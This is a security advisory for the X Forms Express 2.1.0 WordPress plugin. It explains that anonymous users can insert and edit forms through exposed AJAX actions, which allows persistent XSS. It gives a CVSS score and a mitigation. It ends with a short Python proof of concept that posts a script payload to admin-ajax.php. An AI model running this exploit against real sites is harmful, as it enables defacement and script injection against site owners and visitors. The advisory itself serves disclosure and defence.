## X Forms Express 2.1.0, Persistent XSS

Due to exposing two AJAX functions to anonymous users by using the ânoprivâ method of adding AJAX actions, anonymous users are able to insert new forms, and edit the content of existing forms. Utilizing either of these methods can result in a Persistent XSS attack, defacement of website content, or injection of malicious scripts / iframes.

### CVSS Score

4

### CSSS Vector

(AV:N/AC:L/Au:S/C:P/I:N/A:N)

### Attack Scope

remote

### Authorization Required

None

### Mitigation

Remove the two vulnerable AJAX definitions in the âincludes/Core/class.db.phpâ file, specifically âwp\_ajax\_nopriv\_do\_insertâ and âwp\_ajax\_nopriv\_do\_editâ.
Inadequate response from vendor â would advise against using this plugin

### Proof of Concept

The following Python script will update the content of the form with the ID of 1 to contain the content specified in the âform\_fieldsâ payload field.

```
import requests
url = 'http://localhost/wp-admin/admin-ajax.php'
payload = {
	"action":"do_edit",
	"table":"wap_x_forms",
	"edit_Id":1,
	"form_fields":"<script>alert('.');</script>"}
r = requests.post(url, data=payload)
```
